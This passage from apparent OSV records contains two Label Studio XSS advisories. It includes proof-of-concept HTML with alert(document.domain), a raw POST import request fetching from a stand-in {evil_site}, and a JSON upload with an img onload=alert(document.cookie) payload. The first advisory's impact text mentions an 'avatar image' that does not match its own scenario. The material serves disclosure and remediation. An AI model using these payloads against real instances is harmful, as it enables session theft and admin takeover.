FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]}}